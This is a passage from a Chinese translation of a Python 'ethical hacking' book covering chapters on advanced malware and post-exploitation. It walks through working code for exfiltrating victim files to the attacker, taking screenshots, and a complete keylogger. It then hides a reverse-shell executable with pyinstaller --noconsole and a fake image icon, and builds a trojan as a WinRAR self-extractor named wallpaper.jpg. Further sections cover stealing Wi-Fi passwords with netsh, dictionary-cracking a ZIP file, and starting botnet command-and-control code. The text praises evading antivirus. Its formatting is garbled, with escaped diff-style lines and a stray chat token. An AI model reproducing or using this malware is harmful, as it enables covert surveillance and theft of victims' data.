+  \ 循环迭代地通过网络发送它们，直到读取文件末尾。此循环将在没有更多 chunk 可从文件中读取时停止。一旦我们通过网络将完整文件发送给黑客，我们需要发送标识符标记以便黑客知道可以停止进一步读取。为此，我们发送\
+  \ eof_identifier，其值如下，eof_identifier = \"<END_OF_FILE_IDENTIFIER>\"。黑客将使用此标识符来知道传入数据已完成。\n\
+  \n接下来，我们需要在黑客程序中接收此数据。为此，转到黑客程序并检查 exists 变量接收到的值。如果受害者的回复是 yes，这意味着文件存在于受害者机器上，我们可以开始下载它。请注意，我们刚刚开发了发送数据的程序，现在在这里我们将接收相同的数据。接收到的数据将以字节形式存在，我们将把这些字节写入我们的黑客\
+  \ PC 以生成与受害者 PC 相同的<|message|>。让我们看一下以下代码：\n\n```\nif exist.decode() == \"yes\"\
+  :\n    print(\"file exists\")\n    # receive file here\n    file_name = command.strip(\"\
+  download \")\n    \n    with open(file_name, \"wb\") as file:\n        print(\"\
+  Downloading file\")\n        while True:\n            chunk = hacker_socket.recv(CHUNK_SIZE)\n\
+  \            file.write(chunk)\n            if chunk.endswith(eof_identifier.encode()):\n\
+  \                chunk = chunk[:-len(eof_identifier)]\n                file.write(chunk)\n\
+  \                break\n    \n    print(\"Successfully downloaded, \", file_name)\n\
+  ```\n\n如果文件存在，我们将使用与 file_name 相同的名称创建一个新文件。请注意，我们以 wb 或写二进制模式创建文件，以便我们可以下载任何类型的文件。一旦我们创建文件，我们需要写入从受害者接收到的文件内容。我们将\
+  \ CHUNK_SIZE 变量定义为与我们在受害者发送时定义的大小相同，然后我们开始连续接收数据并将其写入磁盘直到结束，该结束由标记标识。您需要在受害者中定义完全相同的\
+  \ eof_identifier 变量，否则程序将无法工作。一旦我们到达标识符，我们将移除标识符，将剩余字节写入磁盘，然后退出循环。最后，我们可以打印一条语句，表明我们已接收到所有数据。现在我们的程序已完成，使用此程序，我们可以从受害者下载数据到黑客。\n\
+  \n\n\n\n\n黑客的完整代码如下所示：\n\nhttps://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example10-hacker-advanced/hacker.py\n\
+  \n同样，受害者用于向黑客发送文件的完整代码如下所示：\n\nhttps://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example11-advanced-victim/advanced-victim.py\n\
+  \n现在，让我们尝试运行这个程序。首先运行黑客程序，然后运行受害者程序。\n\n在受害者电脑上创建一个名为 passwords.txt 的文件，并在其中写入一些随机密码：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_159_0.png)\n\n图 7.2 – 受害者电脑上的密码文件\n\n\
+  接下来，在黑客程序中写入以下命令：download passwords.txt。\n\n现在，一旦程序运行，你将在黑客电脑上看到完全相同的文件：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_159_1.png)\n\
+  \n图 7.3 – 从受害者下载文件\n\n## 截屏\n\n你也可以使用恶意软件截取受害者电脑的屏幕。为此，你需要安装额外的库。我们需要一个名为 pyautogui\
+  \ 的模块。该模块将帮助你在受害者电脑上截屏：\n\n- 1. 要安装它，请前往你的受害者机器并写入以下命令进行安装。最好创建一个虚拟环境并在虚拟环境中安装此程序：\n\
+  - 2. 接下来，我们需要定义截屏的用例。在黑客程序中，创建一个新的 case 并设置以下条件：\n- 3. 同样，在受害者程序中，也写入相同的 case：\n\
+  - 4. 让我们运行这个程序看看输出是什么样的。在黑客机器上，输出应如下所示：\n\n```\npip install pyautogui\n```\n\n这将安装所需的模块。\n\
+  \n```\nif command == \"screenshot\":\n    print(\"Taking screenshot\")\n```\n\n\
+  ```\nelif hacker_command == \"screenshot\":\n    print(\"Taking screenshot\")\n\
+  \    screenshot = pyautogui.screenshot()\n    screenshot.save(\"screenshot.png\"\
+  )\n    print(\"screenshot saved\")\n```\n\n这将在受害者电脑上以 screenshot.png 的名称保存截屏。\n\n\
+  ![](img/d31345bbfd15f63be2920f0de5fa30dc_161_0.png)\n\n图 7.5 – 黑客程序截屏\n\n受害者程序如下所示：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_162_0.png)\n\n图 7.6 – 受害者程序截屏\n\n5. 如果你前往受害者电脑，你会看到磁盘上保存了一个名为\
+  \ screenshot.png 的文件。你可以使用我们之前学过的方法将此文件检索到黑客电脑。只需在黑客程序中写入以下命令：\n\n```\ndownload\
+  \ screenshot.png\n```\n\n这将把截屏移动到黑客电脑。我截取了以下截屏：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_163_0.png)\n\
+  \n图 7.7 – 在 Windows PC 上截取的屏幕截图\n\n在本节中，我们学习了如何使用黑客程序截取受害者电脑的屏幕，以及如何将文件传输到黑客电脑。在下一节中，我们将学习如何创建键盘记录器来跟踪受害者的击键。\n\
+  \n## 键盘记录器\n\n在本节中，我们将构建一个简单的键盘记录器。键盘记录器是一种记录用户击键的恶意软件程序。它是最常见的恶意软件类型之一。键盘记录器通常用于窃取密码和其他敏感信息，例如信用卡。键盘记录器通常被设计为尽可能安静，这意味着键盘记录器非常难以检测。让我们尝试构建一个简单的键盘记录器。你需要安装一个名为\
+  \ pynput 的模块来构建键盘记录器。该模块允许你以编程方式访问击键：\n\n- 1. 要安装此模块，请使用以下命令：\n```\npip install\
+  \ pynput\n```\n这将安装该模块：\n- 2. 安装模块后，我们可以从该模块导入 keyboard：\n```\nfrom pynput import\
+  \ keyboard\n```\n- 3. 接下来，我们将定义一个用于监听击键的监听器。该监听器将在不同事件上处理不同的情况。看一下以下代码：\n```\nwith\
+  \ keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:\n    listener.join()\n\
+  ```\n\n```\npip install pynput\n```\n\n```\nfrom pynput import keyboard\n```\n\n\
+  ```\nwith keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:\n\
+  \    listener.join()\n```\n\n之前的代码为按键的 *按下* 和 *释放* 定义了两个函数。当按下键时，将调用 onPress 函数，当释放键时，将调用\
+  \ onRelease 函数。\n\n4. 现在我们将定义这些函数。让我们看一下这些函数：\n\n```\ndef onPress(key):\n    print(str(key))\n\
+  \ndef onRelease(key):\n    if str(key) == 'Key.esc':\n        return False\n```\n\
+  \n我们定义了非常简单的函数。当我们按下键时，我们简单地打印它，当键被释放时，我们检查按下了哪个键。如果按下的键是 *Esc* 键，我们退出程序，否则继续。这样，我们有一个退出条件，不会被卡住。如果我们不定义此条件，就无法退出程序，因为按下\
+  \ *Ctrl + C* 只会打印它而不是退出。为了安全地返回此函数，我们返回 False 值。让我们看一下简单的执行情况：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_164_0.png)\n\
+  \n图 7.8 – 打印按下的键\n\n在此屏幕截图中，我们在程序执行期间打印了按下的键。当我们按下 *Esc* 键时，它退出了程序。这就是一个非常基本的键盘记录器的全部内容。然而，在实际情况下，你将在受害者机器上运行此程序，因此仅在控制台上打印并不是很有帮助。理想情况下，我们希望保留这些击键的日志。许多键盘记录器将击键存储在文件中，黑客可以检索并查看是否输入了任何密码或其他敏感信息。\n\
+  \n5. 现在我们将对键盘记录器进行更改，使其更有用。让我们创建一个新的文件名，keylogs.txt。\n\n我们将在此文件中存储日志。让我们看一下代码：\n\
+  \n```\nimport sys\nfilename = \"keylogs.txt\"\n\nfile = open(filename, \"w\")\n\
+  def onPress(key):\n    print(str(key))\n    file.write(str(key))\n\ndef onRelease(key):\n\
+  \    if str(key) == 'Key.esc':\n        file.close()\n        sys.exit(0)\n```\n\
+  \n这里我们在写模式下创建一个文件，每次按下键时，我们都会将键存储在文件中。最后，当按下 Esc 键时，我们关闭文件并退出。如果你启动程序并运行它并按下一些键，你会看到创建了一个新文件，并且所有键日志都存储在文件中。这是我的执行结果：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_165_0.png)\n\n图 7.9 – 存储在文件中的击键\n\n6.\
+  \ 你可以在前面的屏幕截图中看到，每个字符周围都有引号。我们可以删除这些引号以提高可视性。为了替换它，我们可以更新以下代码：\n\n```\ndef onPress(key):\n\
+  \    print(str(key))\n    stroke = str(key).replace(\"'\", \"\")\n    if str(key)\
+  \ == \"Key.esc\":\n        file.write(\" \")\n    else:\n        file.write(stroke)\n\
+  ```\n\n这里，我们做了两个更改。首先，我们在写入文件之前将单引号替换为空字符串，其次，如果键是 Esc，我们不将其写入文件。现在，如果你运行程序，你会看到它只注册字符。\n\
+  \n如果你按下任何特殊键，例如 Enter 或空格，你会看到程序注册其名称而不是其功能，这不是我们想要的。我们希望在用户按下空格按钮时看到一个空格。为此，我们将添加以下更改：\n\
+  \n```\ndef onPress(key):\n    print(str(key))\n    stroke = str(key).replace(\"\
+  '\", \"\")\n    if str(key) == \"Key.space\":\n        file.write(\" \")\n    elif\
+  \ str(key) == \"Key.enter\":\n        file.write(\"\\n\")\n    elif str(key) ==\
+  \ \"Key.esc\":\n        file.write(\" \")\n    else:\n        file.write(stroke)\n\
+  ```\n\n\n\n\n7. 我们的键盘记录器已基本完成。我们只需再添加最后一个修改。我们的键盘记录器不支持退格键。要添加此功能，请看下面的代码：\n\n```\n\
+  import os\n    elif str(key) == \"Key.backspace\":\n        file.seek(file.tell()-1,\
+  \ os.SEEK_SET)\n        file.write(\"\")\n```\n\n这段代码会检测退格键，如果遇到退格键，我们就向后移动一个字符，并在那里写入一个空字符串。这会替换文件中已存储的现有字符。现在，我们的基础键盘记录器已经完成。它既支持字符插入，也支持退格记录功能。键盘记录器的完整代码如下：\n\
+  \n```\nfrom pynput import keyboard\nimport sys\nimport os\n\nfilename = \"keylogs.txt\"\
+  \n\nfile = open(filename, \"w\")\n\n\ndef onPress(key):\n    print(str(key))\n \
+  \   stroke = str(key).replace(\"'\", \"\")\n    if str(key) == \"Key.space\":\n\
+  \        file.write(\" \")\n    elif str(key) == \"Key.enter\":\n        file.write(\"\
+  \\n\")\n    elif str(key) == \"Key.esc\":\n        file.write(\" \")\n    elif str(key)\
+  \ == \"Key.backspace\":\n        file.seek(file.tell()-1, os.SEEK_SET)\n       \
+  \ file.write(\"\")\n    else:\n        file.write(stroke)\n```\n\n```\ndef onRelease(key):\n\
+  \    if str(key) == 'Key.esc':\n        file.close()\n        sys.exit(0)\nif __name__\
+  \ == \"__main__\":\n    with keyboard.Listener(on_press=onPress, on_release=onRelease)\
+  \ as listener:\n        listener.join()\n```\n\n在本节中，我们学习了如何部署一个简单的键盘记录器。以此为基础，你可以编写一个更高级的键盘记录器。\n\
+  \n## 总结\n\n在本章中，我们学习了如何为我们的基础恶意软件添加高级功能。首先，我们增加了从受害者到客户端的文件传输支持，然后添加了附加功能，例如截取受害者机器的屏幕截图并将其发送回黑客。最后，我们构建了自己的键盘记录器。每天都有成千上万的恶意软件被编写出来，杀毒软件努力跟上它们的检测步伐。自己编写恶意软件的优势在于，由于它由你编写，且尚不存在于杀毒软件数据库中，杀毒软件并不容易检测到它。这让你有更大机会成功发动攻击。使用我们在本章中开发的工具，你将理解如何构建更高级的恶意软件，以及如何随心所欲地为其添加更多功能。通过编写自定义恶意软件所获得的技能，将为你提供更多隐蔽攻击的机会，并减少被杀毒软件检测到的可能。\n\
+  \n在下一章中，我们将了解如何将代码打包成单个可执行文件，以及如何将其用于黑客攻击。下一章见！\n"
+- "# 8\n\n## 后渗透\n\n在第 7 章“高级恶意软件”中，我们学习了如何为恶意软件程序添加一些高级功能。你可以根据自己的需要为恶意软件添加任意数量的功能。代码编写完成后，接下来就是实现部分。你如何打包恶意软件并使其便于部署？在本章中，我们将了解恶意软件部署的以下方面：\n\
+  \n- 打包恶意软件\n- 了解木马\n- 通过公网 IP 发起攻击\n- 破解密码\n- 窃取密码\n- 创建僵尸网络\n\n### 打包恶意软件\n\n我们在第\
+  \ 7 章“高级恶意软件”中开发的程序是一个 Python 文件，它还包含一些依赖项。在没有物理访问权限的情况下，很难在受害者的机器上运行 Python 文件。这使得我们的程序不太实用，除非我们有办法将所有内容打包成一个可执行文件，将其发送给受害者；当受害者打开它时，它会向黑客的电脑建立反向\
+  \ shell。\n\n将 Python 代码打包成可执行文件，需要同时包含程序的所有依赖项。这正是我们使用*虚拟环境*的原因。虚拟环境使程序能够将所有依赖项保存在一起，这样当我们打包代码时，包括\
+  \ Python 解释器在内的一切都会被包含在可执行文件中，因此我们无需在受害者电脑上安装任何东西，程序即可完美运行。\n\n### 了解 pyinstaller\
+  \ 库\n\n幸运的是，有一种方法可以实现上述目标。这需要使用一个名为 `pyinstaller` 的 Python 库。它可以帮助我们将代码打包成一个漂亮的二进制可执行文件，在\
+  \ Windows 上扩展名为 `.exe`。要安装 `pyinstaller`，请执行以下命令：\n\n```\npip install pyinstaller\n\
+  ```\n\n请注意，此命令应在启用虚拟环境的情况下安装，以便我们拥有所有必需的依赖项。打开你的高级恶意软件（受害端程序）并启用虚拟环境。完成后，使用上述命令安装\
+  \ `pyinstaller`。\n\n如果你还没有创建虚拟环境，可以在 Python 恶意软件文件所在的文件夹中运行以下命令来创建它：\n\n```\npython\
+  \ -m venv myenv\n```\n\n稍等片刻，等待安装完成。完成后，你可以通过启动一个新终端，或在脚本文件夹或 `myenv` 中运行 `activate.bat`\
+  \ 脚本，来激活环境。\n\n如果你成功激活了 Python 环境，你将看到类似下面的内容：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_170_0.png)\n\
+  \n图 8.1 – Python 环境已启用\n\n请注意，我们在高级恶意软件中使用了一个外部依赖项 `pyautogui`。我们也需要将这个依赖项安装到虚拟环境中。如果你的恶意软件添加了任何其他需要外部依赖项的功能，也请一并安装。所有依赖项安装完成后，就可以在虚拟环境中使用\
+  \ `pip install pyinstaller` 安装 `pyinstaller`。如果一切操作正确，在命令终端中输入 `pyinstaller`，你应该会看到以下输出：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_0.png)\n\n图 8.2 – pyinstaller 安装\n\
+  \n在图 8.2 中，你可以看到 pyinstaller 的可用选项列表。接下来，要生成可执行文件，请输入 pyinstaller -onefile advanced_malware.py。这会将所有代码及其依赖项编译成单个文件，并创建如下文件夹结构：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_1.png)\n\n图 8.3 – 文件夹结构\n\n你需要注意的文件夹是\
+  \ dist 文件夹，它代表 distribution（分发）。你的可执行文件将位于此处。继续，在文件资源管理器中打开这个文件夹：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_2.png)\n\
+  \n图 8.4 – 可执行文件\n\n你会发现一个与你的 Python 文件名同名的可执行文件，其扩展名为 .exe。现在，如果你在黑客程序运行的同时直接运行这个文件，你就会收到一个反向连接。无论受害者系统上是否安装了\
+  \ Python，这个可执行文件都能正常运行。继续，运行你的黑客程序，然后双击这个可执行文件将其打开。黑客程序将显示如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_172_0.png)\n\
+  \n类似地，在受害者的电脑上，你会看到一个带有类似界面的控制台弹出窗口：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_172_1.png)\n\
+  \n如果你仔细查看图 8.6 的顶部，会看到正在运行的可执行文件的名称。你可以清楚地看到，现在运行的是一个可执行文件，而不是 Python 脚本，同时达到了相同的目标。\n\
+  \n不过，这里有一个小问题。如果受害者点击这个可执行文件，他们会看到一个命令提示符弹出，显示正在发生的一切，这显然不是我们想要的，因为这会提醒受害者有事情正在发生。我们希望这一切在后台进行，让受害者完全不知道发生了什么。为了隐藏控制台，我们可以向命令添加以下参数：\n\
+  \n```\npyinstaller --onefile --noconsole advanced_malware.py\n```\n\n\n\n\n\n如果在黑客程序运行时现在点击可执行文件，你会看到屏幕上没有任何反应，因为没有弹出控制台窗口，不过连接会在后台建立。你可以通过打开任务管理器来查看可执行文件是否在后台运行：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_173_0.png)\n\n图 8.7 – 后台进程\n\n在前面的截图中的后台进程中，你可以看到程序正在运行，并且连接将被建立。请注意，如果你的程序在受害者机器上不能正确运行命令，请前往你的受害者程序，在你执行系统命令的地方添加以下参数：stdin=subprocess.DEVNULL。完整的命令将如下所示：\n\
+  \n```\noutput = subprocess.run([\"powershell.exe\", hacker_command], shell=True,\
+  \ capture_output=True, stdin=subprocess.DEVNULL)\n```\n\n出现此错误的原因是控制台的标准输入未得到妥善处理。如果你运行黑客程序上的任何命令，它应该能正常运行。以下示例是我运行\
+  \ dir 命令的情况：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_174_0.png)\n\n图 8.8 – 在“noconsole”模式下执行命令\n\
+  \n现在我们已经创建了一个相当隐蔽的恶意软件，它可以在受害者计算机上后台运行，并让我们控制受害者 PC。但这个程序仍有一个小问题，即它需要用户点击恶意软件可执行文件，这取决于受害者，难度可能不同或容易。如果用户不是很懂技术，你可以很容易地诱骗他们运行它，否则会很困难。现在我们将讨论转向特洛伊木马以及它们的工作原理。我们将在下一节中构建一个小型特洛伊木马恶意软件。\n\
+  \n## 理解特洛伊木马\n\n在上一节中，我们创建了一个可执行文件，可以单次点击运行，然后你将与受害者建立反向连接，但这需要受害者手动打开并点击可执行文件。这里就出现了特洛伊木马的概念。特洛伊木马是一种以非常不起眼的方式隐藏的恶意软件程序。通常，这些特洛伊木马恶意软件会与合法软件合并或捆绑在一起，并在受害者尝试打开合法应用程序或文件时运行。你会发现很多时候，这些病毒会与\
+  \ PDF 或图像文件合并。将恶意软件隐藏在特洛伊木马中是一项复杂的工作，因为很多时候，你所学到的技巧会在你所使用的软件的更新中迅速被修补。例如，假设你发现了软件中的一个漏洞，允许你在文件中嵌入恶意软件。除非你是第一个发现此漏洞的人，否则很有可能在一天或两天内就会被修补。\n\
+  \n## 为可执行文件添加图标\n\n如果我们查看上一节中开发的可执行文件，它有一个 Python 图标，这可能使其看起来像是一个 Python 可执行文件。这对于黑客目的来说不是很有帮助，因为它很容易被检测到。一个办法是向可执行文件添加图像图标，使其看起来像图像而不是可执行文件。这会让用户看起来像是在点击打开图像，而实际上他们正在运行可执行文件。我们可以使用\
+  \ pyinstaller 添加图标。为此，我们需要一个扩展名为 .ico 的图像。\n\n取任意图像并将扩展名转换为 .ico。你可以使用任何在线工具进行转换，应该很容易。我将使用以下示例网站将我的图像转换为\
+  \ ICO 格式：online-convert.com。\n\n转换图像后，将转换后的文件放置在受害者恶意软件程序所在的同一目录中。完成后，你可以使用以下命令为可执行文件添加图标。\n\
+  \n你可以将文件命名为 icon.ico 并为 pyinstaller 编写以下命令：\n\n```\npyinstaller --onefile --noconsole\
+  \ -icon=icon.ico advanced_malware.py\n```\n\n如果打开 dist 文件夹，你会看到，现在可执行文件不再是 Python\
+  \ 图标，而是取决于你选择的图像的不同图标。我的文件看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_175_0.png)\n\
+  \n在前面的截图中，你可以看到图标现在已经改变，现在很容易诱骗受害者点击此文件。现在如果你点击此文件，你会看到它会建立到黑客的后台连接，你可以通过 Windows\
+  \ 中的任务管理器进行验证。\n\n## 创建你自己的特洛伊木马\n\n前面的特洛伊木马在某些情况下会起作用，应该足够了。然而，当用户点击后受害者计算机上没有任何反应时，用户可能会猜到有些不对劲。理想情况下，我们希望用户点击可执行文件时打开一个图像，并同时建立回黑客的连接。这样，用户认为他们只是打开了图像，而实际上，他们打开了图像并同时创建了到黑客的反向\
+  \ shell。在本节中，我们将尝试进一步隐藏我们的恶意软件。\n\n要创建恶意软件特洛伊木马，你需要四项内容，如下所示：\n\n- 1. 带有图标的恶意软件可执行文件\n\
+  - 2. *WinRAR* 程序\n- 3. 用于图标的图像，格式为 .jpg\n- 4. 带有 .ico 扩展名的图标图像\n\n从此网站安装 *WinRAR*\
+  \ 软件：https://www.win-rar.com/。\n\n过程应该很简单。完成后，将可执行文件（1）、图像（3）和图标（4）复制到一个新文件夹中。我创建了一个名为\
+  \ trojan 的新文件夹并将所有三项粘贴在其中：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_176_0.png)\n\
+  \n图 8.10 – 特洛伊木马内容\n\n第一个 advanced_malware.exe 是可执行文件，第二个是图标文件，第三个是用于图标的 .jpg 图像。\n\
+  \n现在选择所有三个文件，右键单击选择添加到压缩文件选项：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_177_0.png)\n\
+  \n图 8.11 – 添加到压缩文件\n\n这将打开一个新的对话框。它看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_178_0.png)\n\
+  \n图 8.12 – WinRAR 对话框\n\n让我们将文件重命名为 wallpaper.jpg。选择压缩方式为最佳，并勾选创建 SFX 压缩包框。现在进入高级选项卡并打开\
+  \ SFX 选项。\n\n它将打开一个新的对话框。进入更新选项卡并选择提取并更新文件和覆盖所有文件：\n\n然后进入模式选项卡并勾选解压到临时文件夹，并同时选择隐藏所有以实现静默模式：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_180_0.png)\n\n图 8.15 – SFX 模式\n\n最后，进入设置选项卡并在提取后运行字段中写入以下内容：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_180_1.png)\n\n图 8.16 – 提取后运行\n\n这将允许我们在提取完成后按顺序运行文件。首先，我们将打开向受害者显示的实际图像，并在后台同时运行恶意软件，这将为黑客提供反向连接。\n\
+  \n现在一切都已按我们的需求设置好。只需点击确定创建压缩文件，它将在同一文件夹中创建一个名为 wallpaper.jpg 的新文件。表面上，它看起来像一个普通的图像文件，但如果你打开它，你会看到它会创建反向连接，如果你正在运行黑客服务器：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_181_0.png)\n\n图 8.17 – 特洛伊木马\n\n在图 8.16\
+  \ 中，你可以看到我们创建了一个名为 wallpaper.jpg 的特洛伊木马。如果你仔细观察，你会看到它具有应用程序类型，但在 Windows 中，扩展名默认是隐藏的，我们已将其命名为\
+  \ wallpaper.jpg 使其看起来像图像。并且如果你点击该图像，它将打开图像并同时与黑客建立反向连接。继续自己尝试吧。我们的当前恶意软件攻击到目前为止只在私有\
+  \ IP 上起作用。在下一节中，我们将学习如何在公共 IP 上执行相同的攻击。\n\n## 通过公共 IP 进行攻击\n\n到目前为止，我们所做的所有攻击都在本地网络上。这要求你、黑客和受害者连接到同一网络。对于许多攻击场景来说，这可能并非如此。这就是公共\
+  \ IP 发挥作用的地方。我们在讨论网络介绍时已经了解了公共和私有 IP 地址。为了进行成功的攻击，我们需要知道黑客的公共 IP。在黑客机器上，你可以通过访问\
+  \ google.com 并输入 my public ip 来找到你的公共 IP，这将显示你的公共 IP 地址，前提是你没有使用任何 VPN 或网络伪装方案。它将是一个类似\
+  \ 32 位的地址，由你的 ISP 提供。我的公共 IP 是 31.38.10.X。最后 8 位因隐私问题被屏蔽。你的 IP 将根据你所在的位置而不同。找到它应该不会太困难。一旦你有了公共\
+  \ IP 地址，请前往受害者程序，并用黑客的公共 IP 地址代替黑客的私有 IP 地址。\n\n\n\n\n\n我们的谜题的第一部分已经完成。下一部分是让数据包成功到达黑客机器。黑客必须能够在指定的端口上接收数据包。为此，黑客必须在其路由器设置中启用*端口转发*。出于安全目的，大多数路由器设置中默认会禁用端口转发。但是，如果你知道路由器面板的密码，你就可以这样做。为了访问这些设置，找到你的\
+  \ Wi-Fi 路由器，很可能在路由器的背面会有一张贴纸，上面写着路由器的服务器地址。它会像 192.168.1.1 或类似的东西。请注意，这将取决于你的具体路由器，我无法提供给你。路由器上还写有密码和用户名。进入你的路由器设置页面。\n\
+  \n一旦进入路由器设置，找到**端口转发**设置。这些将取决于你的路由器。在那里你会看到一个选项，选择要将数据包转发到哪个端口。输入你为黑客程序使用的端口号并保存设置。现在你就完成了，你也可以通过公共\
+  \ IP 进行攻击。这将帮助你攻击不在本地网络中的受害者。\n\n## 破解密码\n\n在本节中，我们将学习如何使用密码数据库破解受密码保护的文件。我们将在本节中尝试破解一个\
+  \ ZIP 文件。ZIP 文件是一种二进制格式，用于以压缩格式存储文件，并且可以受密码保护。我们将进行字典攻击。让我们先学习什么是字典攻击！\n\n字典攻击是一种攻击，黑客通过使用一组预定义的密码来猜测受害者的密码。他们通常有一个存储在文件中的非常大的密码数据库，并尝试使用其中一个密码来查看受害者的密码是否与密码列表匹配。此密码列表通常是从被入侵网站和其他论坛的密码泄露中获得的。这就是为什么你永远不应该对一个网站重复使用密码超过一次。如果你对一个网站使用相同的密码并且该网站被入侵，很可能你所有的密码都可能被泄露。\n\
+  \n你可以在这里找到最常用的密码列表：https://github.com/danielmiessler/SecLists。\n\n该列表包含大约 1000 万个密码，并且会定期更新。如果用户使用的是存储在此文件中的密码，你可以轻松破解它。\n\
+  \n我已从前面提到的 GitHub 仓库下载了一个文件。让我们看看其内容。\n\n```\nbreak\n```\n\n```\nexcept Exception\
+  \ as err:\n```\n\n```\npass\n```\n\n在之前的代码中，我们逐个读取密码并进行测试。请注意，为了测试密码，它应为二进制形式而不是字符串格式。如果密码不匹配，我们只需引发异常并转到下一个密码。如果匹配，我们打印找到匹配的语句并中断循环，如果你查看目录，你会看到将创建一个新文件夹，其中包含未加密的文件：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_184_0.png)\n\n图 8.19 – 密码破解\n\n在这里我们测试各种密码，当密码匹配时，我们提取文件并中断循环，正如你清楚地看到密码是\
+  \ qwerty。在本节中，我们学习了如何破解受密码保护的文件。在下一节中，我们将学习如何创建僵尸网络以及它们如何对我们有用。\n\n## 盗取密码\n\n在本节中，我们将看到如何窃取存储在受害者\
+  \ PC 上的 Wi-Fi 密码。请注意，我们已经讨论过如何使用我们的黑客程序在 Windows 机器上执行命令。我们可以利用此程序来检索 Wi-Fi 密码。请注意，你的虚拟操作系统可能未安装\
+  \ Wi-Fi 驱动程序。我已安装此驱动程序。如果你愿意，你也可以为此目的使用你的主机 PC。\n\n为了访问受害机器上存储的接入点，你需要运行以下命令：\n\n\
+  ```\nnetsh wlan show profiles\n```\n\n如果你在命令提示符中运行此命令，你将看到你用 PC 连接过的所有接入点。但我们想要访问密码，而不是接入点。这是我的\
+  \ PC 的屏幕截图：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_185_0.png)\n\n图 8.20 – 已连接的接入点\n\
+  \n为了获取密码，你必须写下接入点的名称并给命令添加一个额外的参数，key=clear。完整的命令将如下所示：\n\n```\nnetsh wlan show\
+  \ profiles \"POCO X3 NFC\" key=clear\n```\n\n你将看到类似的输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_185_1.png)\n\
+  \n图 8.21 – 检索密码\n\n安全设置中的最后一个字段是该接入点的明文密码。如果你已在虚拟操作系统（Windows）上安装了 Wi-Fi 驱动程序，你也可以用你的恶意软件程序运行这些命令。\n\
+  \n## 创建僵尸网络\n\n在第 7 章《高级恶意软件》中，我们开发了一个恶意软件程序，其中包含一个黑客和一个受害者程序。这在你想要对特定目标进行攻击时很有用。然而，在很多情况下，你希望有一个命令和控制中心供黑客使用，以及在不同机器上运行的许多受害者程序并与一个黑客程序通信，黑客能够远程控制这些设备。这些就是我们所说的僵尸网络。僵尸网络是运行在不同机器上的小型程序，并与一个命令和控制中心通信。它们被用于许多恶意目的，例如分布式拒绝服务（DDoS）攻击，你可以通过同时生成数百万个请求使某个网站离线，或使用计算机资源来挖掘加密货币，等等。\n\
+  \n让我们开始创建我们自己的僵尸网络，然后创建不同的机器人以与命令和控制中心通信。我们将编写两个程序：一个将称为 Cnc.py 用于命令和控制中心。这将与黑客程序具有相同的目的。另一个将称为\
+  \ bot1.py。你可以创建任意数量的机器人，然而，为了说明目的，我将只创建一个机器人。\n\n创建一个名为 bots 的新项目并创建一个名为 Cnc.py\
+  \ 的新 Python 文件。\n\n这应该在 Kali 机器上创建。\n\n我们需要之前使用过的相同的 socket 库。让我们从导入开始：\n\n```\n\
+  import socket\nfrom threading import Thread\nimport time\n```\n\n由于我们想要创建多个机器人，我们为每个不同的机器人使用线程。线程用于创建并发运行的单独线程。\n\
+  \n接下来，我们将创建一个线程列表和客户端列表。客户端在我们的例子中将是机器人：\n\n```\nthreads = []\nclients = []\n```\n\
+  \n接下来，我们将创建一个名为 listen_for_bots() 的函数，其名称表明它将监听传入的机器人连接：\n\n```\ndef listen_for_bots(port):\n\
+  \    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((\"\
+  \", port))\n    sock.listen()\n    bot, bot_address = sock.accept()\n    clients.append(bot)\n\
+  ```\n\n这与我们之前编写黑客程序时所做的非常相似。唯一的区别是，一旦客户端连接，我们将其添加到客户端列表中，以便我们可以将此连接用于各种目的，就像我们在黑客程序中所做的那样。\n\
+  \n现在我们定义一个 main() 函数，其中将包含我们所有的逻辑：\n\n```\ndef main():\n    print(\"[+] Server bot\
+  \ waiting for incoming connections\")\n    starting_port = 8085\n    bots = 3\n\
+  ```\n\n我们定义想要使用的端口。请注意，这是一个 starting_port，我们将为不同的客户端使用不同的端口。我们只需为每个新客户端将此数字加 1。变量\
+  \ bots=3 表明我们只想连接三个机器人，然而，你可以添加任意数量的客户端：\n\n```\nfor i in range(bots):\n    t =\
+  \ Thread(target=listen_for_bots, args=(i + starting_port, ), daemon=True)\n    threads.append(t)\n\
+  \    t.start()\n```\n\n接下来，我们将循环运行这些线程。Daemon=True 意味着我们希望将其作为后台进程运行。然后我们将每个线程附加到一个列表中，以便我们可以访问该线程。\n\
+  \n\n\n\n\nNext, we will run a loop for the command-and-control center. While the\
+  \ clients are connected, we will display the clients and ask the hacker to select\
+  \ the client they want to interact with. Next, we run an internal loop for each\
+  \ bot, which will help us send messages to each bot individually by accessing the\
+  \ element in the list. Here you can define your own logic for a bot. You can send\
+  \ commands over to the bot and run those commands on the PC that the bot is running\
+  \ on. The rest is left up to you to define the functionality as you want. Here we\
+  \ are simply sending a message. Once you have achieved your objective, you can remove\
+  \ the client from the list:\n\n```\nrun_cnc = True\n    while run_cnc:\n       \
